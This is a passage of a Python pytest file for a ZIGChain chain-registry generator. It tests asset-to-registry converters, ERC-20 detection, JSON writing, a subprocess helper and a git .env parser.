    native_asset = NativeAsset(**valid_native_asset_payload)
    factory_asset = FactoryAsset(**valid_factory_asset_payload)
    images = AssetImages(png=None, svg=None)

    native_result = non_ibc_asset_to_chain_registry(native_asset, images)
    factory_result = non_ibc_asset_to_chain_registry(factory_asset, images)

    assert native_result["type_asset"] == "sdk.coin"
    assert factory_result["type_asset"] == "sdk.coin"


def test_non_ibc_asset_to_chain_registry_denom_units_serialized_as_list_of_dicts(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """denom_units are serialized from the DenomUnit Pydantic models to plain dicts.
    The output list must have the same length and values as the declared denom_units."""

    asset = NativeAsset(**valid_native_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    denom_units = result["denom_units"]
    assert isinstance(denom_units, list)
    assert len(denom_units) == 2
    # Base entry at exponent 0 matches base_denom
    assert denom_units[0]["denom"] == "uzig"
    assert denom_units[0]["exponent"] == 0
    # Display entry at the configured decimal precision
    assert denom_units[1]["denom"] == "zig"
    assert denom_units[1]["exponent"] == 6


def test_non_ibc_asset_to_chain_registry_denom_units_with_aliases_preserved(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """When a DenomUnit has aliases declared, they are preserved in the output through
    model_dump. Aliases help wallets look up a denom by alternative names."""

    payload = dict(valid_native_asset_payload)
    payload["denom_units"] = [
        {"denom": "uzig", "exponent": 0, "aliases": ["microzig"]},
        {"denom": "zig", "exponent": 6},
    ]
    asset = NativeAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    base_entry = result["denom_units"][0]
    assert "aliases" in base_entry
    assert "microzig" in base_entry["aliases"]


def test_non_ibc_asset_to_chain_registry_optional_fields_absent_when_not_set(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Optional fields (description, extended_description, coingecko_id, keywords,
    socials, traces, logo_URIs) are stripped by _compact_dict when absent on a minimal asset."""

    asset = NativeAsset(**valid_native_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert "description" not in result
    assert "extended_description" not in result
    assert "coingecko_id" not in result
    assert "keywords" not in result
    assert "socials" not in result
    assert "traces" not in result
    assert "logo_URIs" not in result


def test_non_ibc_asset_to_chain_registry_description_and_extended_description_present_when_set(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Both description fields appear in the output when populated on the asset."""

    payload = dict(valid_native_asset_payload)
    payload["description"] = "The native staking token of ZIGChain."
    payload["extended_description"] = "ZIG is used for governance, staking, and fees."
    asset = NativeAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert result["description"] == "The native staking token of ZIGChain."
    assert result["extended_description"] == "ZIG is used for governance, staking, and fees."


def test_non_ibc_asset_to_chain_registry_coingecko_id_present_when_set(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """coingecko_id appears in the output when set on the asset, allowing price feed lookups."""

    payload = dict(valid_native_asset_payload)
    payload["coingecko_id"] = "zigchain"
    asset = NativeAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert result["coingecko_id"] == "zigchain"


def test_non_ibc_asset_to_chain_registry_keywords_present_when_set(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """keywords appear in the output when set on the asset and the list is preserved exactly."""

    payload = dict(valid_native_asset_payload)
    payload["keywords"] = ["native", "staking"]
    asset = NativeAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert result["keywords"] == ["native", "staking"]


def test_non_ibc_asset_to_chain_registry_socials_serialized_as_dict(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """When the asset has a socials object, it is serialized to a plain dict via model_dump
    so the output JSON contains key/value pairs, not a Python object."""

    payload = dict(valid_native_asset_payload)
    payload["socials"] = {"website": "https://zigchain.com"}
    asset = NativeAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert "socials" in result
    socials = result["socials"]
    assert isinstance(socials, dict)
    # model_dump preserves HttpUrl objects; Pydantic normalizes URLs (adds trailing slash)
    assert str(socials.get("website")).startswith("https://zigchain.com")


def test_non_ibc_asset_to_chain_registry_traces_included_when_asset_has_traces(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """When a NativeAsset has traces declared, build_native_traces produces the list and
    it appears under the 'traces' key in the output."""

    payload = dict(valid_native_asset_payload)
    payload["traces"] = [
        {
            "type": "additional-mintage",
            "counterparty": {"chain_name": "ethereum", "base_denom": "0xA0b86991"},
        }
    ]
    asset = NativeAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert "traces" in result
    assert isinstance(result["traces"], list)
    assert len(result["traces"]) == 1
    assert result["traces"][0]["type"] == "additional-mintage"
    assert result["traces"][0]["counterparty"]["chain_name"] == "ethereum"


def test_non_ibc_asset_to_chain_registry_logo_uris_from_discovered_png(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """When a PNG image file is discovered locally for the asset, logo_URIs is populated
    with a canonical URL pointing to the zigchain images folder in cosmos/chain-registry."""

    asset = NativeAsset(**valid_native_asset_payload)
    # Simulate a locally discovered PNG file for this asset
    images = AssetImages(png="uzig.png", svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert "logo_URIs" in result
    assert "png" in result["logo_URIs"]
    assert "zigchain/images/uzig.png" in result["logo_URIs"]["png"]


def test_non_ibc_asset_to_chain_registry_factory_base_matches_coin_creator_subdenom(
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """For FactoryAssets the base denom in the output must be the full coin.<creator>.<subdenom>
    string, which is enforced by the model and passed through unchanged."""

    asset = FactoryAsset(**valid_factory_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    expected_base = f"coin.{asset.creator}.{asset.subdenom}"
    assert result["base"] == expected_base



######################################################################
# Tests for erc20_from_ibc
######################################################################


def test_erc20_from_ibc_returns_none_when_not_ethereum_origin(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """erc20_from_ibc returns None when origin_chain is not ethereum."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    images = AssetImages(png=None, svg=None)
    result = erc20_from_ibc(asset, images)
    assert result is None


def test_erc20_from_ibc_rejects_origin_chain_with_wrong_case(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """origin_chain with uppercase letters is now rejected at the model level."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "Ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    with pytest.raises(ValidationError):
        IBCAsset(**payload)


def test_erc20_from_ibc_returns_none_when_ethereum_origin_but_non_0x_denom(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """erc20_from_ibc returns None when origin_chain is ethereum but origin_denom does not start with 0x."""

    payload = {**valid_ibc_asset_payload, "origin_chain": "ethereum", "origin_denom": "uatom"}
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)
    result = erc20_from_ibc(asset, images)
    assert result is None


def test_erc20_from_ibc_returns_dict_when_origin_ethereum_and_0x_denom(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """erc20_from_ibc returns chain-registry dict when origin_chain is ethereum and origin_denom starts with 0x."""

    payload = {
        **valid_ibc_asset_payload,
        "origin_chain": "ethereum",
        "origin_denom": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    }
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)
    result = erc20_from_ibc(asset, images)
    assert result is not None
    assert result.get("type_asset") == "erc20"


def test_erc20_from_ibc_denom_units_first_entry_uses_origin_denom_at_exponent_zero(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """The first denom_unit entry uses the EVM contract address (origin_denom) as the denom
    at exponent 0 — this is the raw on-chain denomination for the ERC-20 token."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    first_entry = result["denom_units"][0]
    assert first_entry["denom"] == "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    assert first_entry["exponent"] == 0


def test_erc20_from_ibc_denom_units_first_entry_always_has_empty_aliases_list(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """The first denom_unit entry always contains 'aliases': [] even though it is empty.
    _compact_dict only strips top-level empty lists — it does not recurse into nested dicts,
    so the empty aliases list inside denom_units is preserved in the output."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    first_entry = result["denom_units"][0]
    assert "aliases" in first_entry
    assert first_entry["aliases"] == []


def test_erc20_from_ibc_denom_units_second_entry_uses_display_denom_and_decimals(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """The second denom_unit entry uses display_denom as the human-readable denomination
    at the configured decimal precision."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    second_entry = result["denom_units"][1]
    assert second_entry["denom"] == asset.display_denom
    assert second_entry["exponent"] == asset.decimals


def test_erc20_from_ibc_logo_uris_point_to_ethereum_images_folder(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """logo_URIs are built using the Ethereum images folder in cosmos/chain-registry
    (_non-cosmos/ethereum/images), not the zigchain images folder used by other asset types."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    # Simulate a locally discovered PNG for this asset
    images = AssetImages(png="usdc.png", svg=None)

    result = erc20_from_ibc(asset, images)

    assert "logo_URIs" in result
    assert "_non-cosmos/ethereum/images" in result["logo_URIs"]["png"]


def test_erc20_from_ibc_optional_fields_absent_when_not_set(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Optional fields (description, extended_description, coingecko_id, keywords, socials,
    logo_URIs) are stripped by _compact_dict when absent on a minimal asset."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert "description" not in result
    assert "extended_description" not in result
    assert "coingecko_id" not in result
    assert "keywords" not in result
    assert "socials" not in result
    assert "logo_URIs" not in result


def test_erc20_from_ibc_description_and_extended_description_present_when_set(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Both description fields appear in the output when populated on the asset."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    payload["description"] = "USD Coin on Ethereum."
    payload["extended_description"] = "USDC is a regulated stablecoin issued by Circle."
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert result["description"] == "USD Coin on Ethereum."
    assert result["extended_description"] == "USDC is a regulated stablecoin issued by Circle."


def test_erc20_from_ibc_base_is_origin_denom_not_ibc_hash(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """For ERC-20 entries the 'base' field is the EVM contract address (origin_denom), not
    the IBC hash denom. This differs from ibc_asset_to_chain_registry where base is the ibc/<HASH>."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert result["base"] == "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    assert result["base"] != asset.base_denom


def test_erc20_from_ibc_type_asset_is_erc20(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """type_asset is hardcoded to 'erc20' for all ERC-20 entries regardless of any other
    field values."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert result["type_asset"] == "erc20"


def test_erc20_from_ibc_no_traces_key_in_output(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Unlike ibc_asset_to_chain_registry, the erc20 output has no 'traces' key at all.
    ERC-20 entries in chain-registry describe the token on Ethereum, not the IBC routing."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert "traces" not in result


def test_erc20_from_ibc_coingecko_id_present_when_set(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """coingecko_id appears in the output when set on the asset."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    payload["coingecko_id"] = "usd-coin"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert result["coingecko_id"] == "usd-coin"


def test_erc20_from_ibc_keywords_present_when_set(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """keywords appear in the output when set on the asset and the list is preserved exactly."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    payload["keywords"] = ["stablecoin", "erc20"]
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert result["keywords"] == ["stablecoin", "erc20"]


def test_erc20_from_ibc_socials_serialized_as_dict(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """When the asset has a socials object, it is serialized to a plain dict via model_dump."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    payload["socials"] = {"website": "https://circle.com"}
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert "socials" in result
    assert isinstance(result["socials"], dict)
    # Pydantic normalizes HttpUrl objects (may add trailing slash)
    assert str(result["socials"].get("website")).startswith("https://circle.com")



def test_erc20_from_ibc_returns_none_when_origin_denom_is_bare_0x_prefix(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """A bare '0x' string is not a valid ERC-20 address and should return None."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    payload["origin_denom"] = "0x"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    assert result is None


def test_erc20_from_ibc_returns_none_when_origin_denom_is_short_hex(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """A hex string shorter than 42 chars (0x + 40 hex) is not a valid ERC-20 address."""

    payload = dict(valid_ibc_asset_payload)
    payload["origin_chain"] = "ethereum"
    # 0x + only 4 hex chars — too short for a real contract address
    payload["origin_denom"] = "0xABCD"
    asset = IBCAsset(**payload)
    images = AssetImages(png=None, svg=None)

    result = erc20_from_ibc(asset, images)

    # Assert: regex requires exactly 40 hex chars after 0x — 4 is rejected
    assert result is None


######################################################################
# Tests for write_json
######################################################################

def test_write_json_creates_file_with_valid_json(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """write_json creates the file and parent dirs and writes indented JSON.

    Uses a real ibc_asset_to_chain_registry payload to simulate production use:
    in the pipeline write_json is always called with the output of one of the
    asset-to-chain-registry converters, never with ad-hoc dicts.
    """

    # Arrange: build a real chain-registry dict from a valid IBC asset
    path = tmp_path / "out" / "subdir" / "file.json"
    asset = IBCAsset(**valid_ibc_asset_payload)
    payload = ibc_asset_to_chain_registry(asset, AssetImages(png=None, svg=None))

    # Act
    write_json(path, payload)

    # Assert
    assert path.exists()
    assert path.is_file()
    data = json.loads(path.read_text(encoding="utf-8"))
    assert data == payload


def test_write_json_does_not_raise_when_parent_dir_already_exists(tmp_path: Path) -> None:
    """exist_ok=True means write_json does not raise an error when the parent directory
    already exists. Calling it twice to the same directory is safe."""

    path = tmp_path / "existing" / "file.json"
    path.parent.mkdir(parents=True)  # create the directory before calling write_json

    write_json(path, {"key": "value"})  # must not raise

    assert path.exists()


def test_write_json_overwrites_existing_file_with_new_content(tmp_path: Path) -> None:
    """Opening with 'w' mode replaces the file content on each call. A second write
    to the same path must not append — the old content must be gone."""

    path = tmp_path / "file.json"

    write_json(path, {"version": 1})
    write_json(path, {"version": 2})

    data = json.loads(path.read_text(encoding="utf-8"))
    assert data == {"version": 2}
    assert "version" in data
    assert data["version"] == 2


def test_write_json_output_is_indented_with_two_spaces(tmp_path: Path) -> None:
    """json.dump is called with indent=2, so each nested key is indented by exactly
    two spaces. This makes the output human-readable in the chain-registry repo."""

    path = tmp_path / "file.json"
    write_json(path, {"name": "ZIG"})

    content = path.read_text(encoding="utf-8")
    # With indent=2 the key line starts with exactly two spaces
    assert '  "name": "ZIG"' in content


def test_write_json_file_ends_with_trailing_newline(tmp_path: Path) -> None:
    """A newline is written after json.dump because json.dump itself does not add one.
    This follows the POSIX convention that text files end with a newline."""

    path = tmp_path / "file.json"
    write_json(path, {"key": "value"})

    content = path.read_text(encoding="utf-8")
    assert content.endswith("\n")


def test_write_json_unicode_characters_written_as_utf8_not_escaped(tmp_path: Path) -> None:
    """ensure_ascii=False means non-ASCII characters are written as real UTF-8 bytes,
    not as \\uXXXX escape sequences. Asset names or descriptions with accented characters,
    CJK, or emoji must appear verbatim in the output file."""

    path = tmp_path / "file.json"
    payload = {"name": "日本語", "symbol": "🪙"}

    write_json(path, payload)

    content = path.read_text(encoding="utf-8")
    assert "日本語" in content
    assert "🪙" in content
    # ensure_ascii=False means no \uXXXX escapes for these characters
    assert "\\u" not in content


def test_write_json_empty_dict_payload_writes_empty_json_object(tmp_path: Path) -> None:
    """An empty dict is valid JSON and must be written as {} followed by a newline.
    _compact_dict can produce an empty dict if every field on an asset is None."""

    path = tmp_path / "file.json"
    write_json(path, {})

    data = json.loads(path.read_text(encoding="utf-8"))
    assert data == {}


def test_write_json_nested_payload_structure_preserved(tmp_path: Path) -> None:
    """Nested dicts and lists that appear in real chain-registry payloads (denom_units,
    traces, images) are serialized and round-tripped without loss."""

    path = tmp_path / "file.json"
    payload = {
        "base": "uzig",
        "denom_units": [
            {"denom": "uzig", "exponent": 0},
            {"denom": "zig", "exponent": 6},
        ],
        "logo_URIs": {"png": "https://example.com/zig.png"},
    }

    write_json(path, payload)

    data = json.loads(path.read_text(encoding="utf-8"))
    assert data == payload
    assert len(data["denom_units"]) == 2
    assert data["logo_URIs"]["png"] == "https://example.com/zig.png"


def test_write_json_serializes_pydantic_httpurl(tmp_path: Path) -> None:
    """Regression: model_dump() leaves HttpUrl as a Url object, not a str. The
    stdlib json encoder doesn't know how to serialize it natively. Without a
    custom default the script crashed mid-write_json with 'Object of type
    HttpUrl is not JSON serializable', which surfaced as 18 CI failures via
    the subprocess-based tests in test_generate_chain_registry_verified_only.
    """
    from pydantic import HttpUrl

    path = tmp_path / "file.json"
    payload = {
        "logo_URIs": {
            "png": HttpUrl("https://example.com/zig.png"),
            "svg": HttpUrl("https://example.com/zig.svg"),
        },
        "images": [
            {"image_sync": {"chain_name": "zigchain", "base_denom": "uzig"},
             "png": HttpUrl("https://example.com/zig.png")},
        ],
    }

    write_json(path, payload)

    data = json.loads(path.read_text(encoding="utf-8"))
    assert data["logo_URIs"]["png"] == "https://example.com/zig.png"
    assert data["logo_URIs"]["svg"] == "https://example.com/zig.svg"
    assert data["images"][0]["png"] == "https://example.com/zig.png"


def test_write_json_rejects_truly_unserializable_types(tmp_path: Path) -> None:
    """The custom default whitelists Pydantic URL types and nothing else, so an
    unexpected type (e.g., a class instance) still raises — keeping silent
    stringification of future bugs out of the bug surface."""

    class Opaque:
        pass

    with pytest.raises(TypeError, match="not JSON serializable"):
        write_json(tmp_path / "file.json", {"x": Opaque()})


######################################################################
# Tests for _run
######################################################################


def test_run_returns_completed_process_on_success(tmp_path: Path) -> None:
    """_run returns CompletedProcess with returncode=0 for a successful command."""

    result = _run([sys.executable, "-c", "print('ok')"], cwd=tmp_path)
    assert result.returncode == 0
    assert "ok" in result.stdout


def test_run_env_overrides_valid_key_visible_in_subprocess(tmp_path: Path) -> None:
    """_run merges env_overrides into subprocess env; values are visible to child process."""

    # The child prints ZIGCHAIN_TEST_KEY from its own environment.
    # If the merge worked it prints "sentinel_value"; if not it prints "missing".
    result = _run(
        [sys.executable, "-c", "import os; print(os.environ.get('ZIGCHAIN_TEST_KEY', 'missing'))"],
        cwd=tmp_path,
        env_overrides={"ZIGCHAIN_TEST_KEY": "sentinel_value"},
    )
    assert result.returncode == 0
    assert "sentinel_value" in result.stdout  # proves the override reached the child


def test_run_check_false_does_not_raise_on_nonzero_exit(tmp_path: Path) -> None:
    """When check=False, _run returns the CompletedProcess even if the command fails.

    This is useful when the caller wants to inspect the exit code and output
    themselves instead of getting an automatic exception.
    """

    # Arrange: a Python one-liner that exits with code 1
    cmd = [sys.executable, "-c", "raise SystemExit(1)"]

    # Act: check=False means no exception is raised
    result = _run(cmd, cwd=tmp_path, check=False)

    # Assert: we get back a result object with a non-zero return code
    assert result.returncode != 0


def test_run_no_prompt_true_injects_git_terminal_prompt_zero(tmp_path: Path) -> None:
    """When no_prompt=True, _run adds GIT_TERMINAL_PROMPT=0 to the child environment.

    GIT_TERMINAL_PROMPT=0 tells git not to open an interactive login prompt,
    which would hang a CI job waiting for keyboard input that never comes.
    """

    # Arrange: ask the child process to print the value of that variable
    cmd = [
        sys.executable,
        "-c",
        "import os; print(os.environ.get('GIT_TERMINAL_PROMPT', 'not_set'))",
    ]

    # Act
    result = _run(cmd, cwd=tmp_path, no_prompt=True)

    # Assert: the child sees GIT_TERMINAL_PROMPT set to "0"
    assert result.returncode == 0
    assert "0" in result.stdout


def test_run_no_prompt_false_does_not_set_git_terminal_prompt(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """When no_prompt=False (the default), GIT_TERMINAL_PROMPT is not injected.

    monkeypatch removes any pre-existing GIT_TERMINAL_PROMPT from the parent
    environment so the child starts clean — otherwise a value inherited from
    the developer's shell could make the assertion unreliable.
    """

    # Arrange: ensure the parent process does NOT have this variable set
    monkeypatch.delenv("GIT_TERMINAL_PROMPT", raising=False)

    cmd = [
        sys.executable,
        "-c",
        "import os; print(os.environ.get('GIT_TERMINAL_PROMPT', 'not_set'))",
    ]

    # Act: no_prompt defaults to False
    result = _run(cmd, cwd=tmp_path)

    # Assert: the child does not see the variable
    assert result.returncode == 0
    assert "not_set" in result.stdout


def test_run_env_overrides_none_values_are_not_passed_to_subprocess(tmp_path: Path) -> None:
    """None values in env_overrides are silently ignored and not set in the child env.

    This lets callers build an overrides dict with optional keys set to None
    without worrying about accidentally injecting the string "None" as a value.
    """

    # Arrange: pass a key with value None
    cmd = [
        sys.executable,
        "-c",
        "import os; print(os.environ.get('ZIGCHAIN_NULL_KEY', 'absent'))",
    ]

    # Act
    result = _run(cmd, cwd=tmp_path, env_overrides={"ZIGCHAIN_NULL_KEY": None})

    # Assert: the child does not see the key — it was filtered out
    assert result.returncode == 0
    assert "absent" in result.stdout


def test_run_cwd_sets_working_directory_for_child_process(tmp_path: Path) -> None:
    """_run runs the command inside the directory given by cwd.

    The child process's current directory is the cwd we pass — not the
    directory where the Python script lives.
    """

    # Arrange: create a sub-directory to use as the working dir
    work_dir = tmp_path / "myworkdir"
    work_dir.mkdir()

    # Ask the child to print its own current directory
    cmd = [sys.executable, "-c", "import os; print(os.getcwd())"]

    # Act
    result = _run(cmd, cwd=work_dir)

    # Assert: the path the child sees matches the directory we passed
    assert result.returncode == 0
    # resolve() normalises symlinks (macOS /var → /private/var) before comparing
    assert Path(result.stdout.strip()).resolve() == work_dir.resolve()


def test_run_stderr_output_is_captured_in_stdout(tmp_path: Path) -> None:
    """stderr is redirected into the same pipe as stdout (stderr=STDOUT).

    This means error messages written to stderr by a subprocess appear in
    result.stdout, so callers only need to look in one place for all output.
    """

    # Arrange: write a message to stderr
    cmd = [
        sys.executable,
        "-c",
        "import sys; sys.stderr.write('error_message\\n')",
    ]

    # Act
    result = _run(cmd, cwd=tmp_path)

    # Assert: the stderr text is visible in stdout
    assert "error_message" in result.stdout


def test_run_child_inherits_parent_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """_run copies os.environ so the child inherits all parent env vars.

    We use monkeypatch to set a variable in the parent process for this test
    only — monkeypatch automatically removes it when the test finishes.
    """

    # Arrange: inject a variable into the parent environment for this test
    monkeypatch.setenv("ZIGCHAIN_INHERITED_KEY", "inherited_value")

    cmd = [
        sys.executable,
        "-c",
        "import os; print(os.environ.get('ZIGCHAIN_INHERITED_KEY', 'missing'))",
    ]

    # Act
    result = _run(cmd, cwd=tmp_path)

    # Assert: the child sees the variable from the parent
    assert result.returncode == 0
    assert "inherited_value" in result.stdout

#---------------------
# Negative test
#---------------------

def test_run_raises_called_process_error_on_nonzero_exit(tmp_path: Path) -> None:
    """_run with check=True raises CalledProcessError when command exits non-zero."""

    with pytest.raises(subprocess.CalledProcessError) as exc:
        _run([sys.executable, "-c", "raise SystemExit(1)"], cwd=tmp_path, check=True)

    assert exc.value.returncode == 1
    assert sys.executable in exc.value.cmd


######################################################################
# Tests for _load_git_env_from_env_file
######################################################################


def test_load_git_env_from_env_file_parses_key_value(tmp_path: Path) -> None:
    """_load_git_env_from_env_file parses KEY=value and returns only _GIT_ENV_KEYS."""

    env_file = tmp_path / ".env"
    env_file.write_text(
        "GIT_AUTHOR_EMAIL=dev@example.com\nGIT_AUTHOR_NAME=Dev\n"
        "GIT_COMMITTER_EMAIL=dev@example.com\nGIT_COMMITTER_NAME=Dev\nOTHER=ignored\n",
        encoding="utf-8",
    )
    result = _load_git_env_from_env_file(env_file)
    assert "GIT_AUTHOR_EMAIL" in result
    assert result["GIT_AUTHOR_EMAIL"] == "dev@example.com"
    assert "GIT_COMMITTER_EMAIL" in result
    assert result["GIT_COMMITTER_EMAIL"] == "dev@example.com"
    assert "GIT_COMMITTER_NAME" in result
    assert result["GIT_COMMITTER_NAME"] == "Dev"
    assert "OTHER" not in result


def test_load_git_env_from_env_file_missing_file_returns_empty_dict(tmp_path: Path) -> None:
    """_load_git_env_from_env_file returns empty dict when file does not exist."""

    result = _load_git_env_from_env_file(tmp_path / "nonexistent.env")
    assert result == {}


def test_load_git_env_from_env_file_empty_file_returns_empty_dict(tmp_path: Path) -> None:
    """An empty file (zero bytes) returns an empty dict without raising."""

    env_file = tmp_path / ".env"
    env_file.write_text("", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert result == {}


def test_load_git_env_from_env_file_unknown_key_excluded(tmp_path: Path) -> None:
    """Keys not in _GIT_ENV_KEYS are excluded from the returned dict."""

    env_file = tmp_path / ".env"
    env_file.write_text("UNKNOWN_VAR=secret\nPATH=/bin:/usr/bin\n", encoding="utf-8")
    result = _load_git_env_from_env_file(env_file)
    assert "UNKNOWN_VAR" not in result
    assert "PATH" not in result


def test_load_git_env_from_env_file_blank_lines_are_skipped(tmp_path: Path) -> None:
    """Blank lines between entries are ignored and do not cause errors."""

    env_file = tmp_path / ".env"
    # Two blank lines surrounding the real entry
    env_file.write_text("\n\nGIT_AUTHOR_NAME=Bob\n\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert result.get("GIT_AUTHOR_NAME") == "Bob"


def test_load_git_env_from_env_file_comment_lines_are_skipped(tmp_path: Path) -> None:
    """Lines starting with '#' are treated as comments and ignored."""

    env_file = tmp_path / ".env"
    env_file.write_text(
        "# this is a comment\nGIT_AUTHOR_NAME=Carol\n# another comment\n",
        encoding="utf-8",
    )

    result = _load_git_env_from_env_file(env_file)

    # Only the real entry is returned; comments do not appear as keys
    assert result.get("GIT_AUTHOR_NAME") == "Carol"
    assert len(result) == 1


def test_load_git_env_from_env_file_export_prefix_is_stripped(tmp_path: Path) -> None:
    """Lines written as 'export KEY=value' (shell-sourceable format) are supported.

    The 'export' prefix is stripped before parsing so the key is recognised
    the same way as a plain KEY=value line.
    """

    env_file = tmp_path / ".env"
    env_file.write_text("export GIT_AUTHOR_NAME=Alice\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert result.get("GIT_AUTHOR_NAME") == "Alice"


def test_load_git_env_from_env_file_line_without_equals_is_skipped(tmp_path: Path) -> None:
    """A line that has no '=' character is not a key-value pair and is silently skipped."""

    env_file = tmp_path / ".env"
